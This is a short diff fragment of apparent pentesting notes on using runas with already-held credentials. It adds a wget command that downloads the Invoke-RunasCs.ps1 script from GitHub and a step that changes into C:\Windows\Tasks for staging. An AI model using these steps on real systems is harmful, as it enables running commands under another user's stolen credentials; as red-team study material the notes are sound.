@@ -1,5 +1,11 @@
 **`runas`** command when you **already possess a set of valid credentials** (username and password) for another user account on the target system and want to execute a command or launch a shell under that user's security context.
 
+Invoke-RunasCs.ps1
+```
+wget https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1
+```
+
+
 ```
 cd C:\Windows\Tasks
 ```
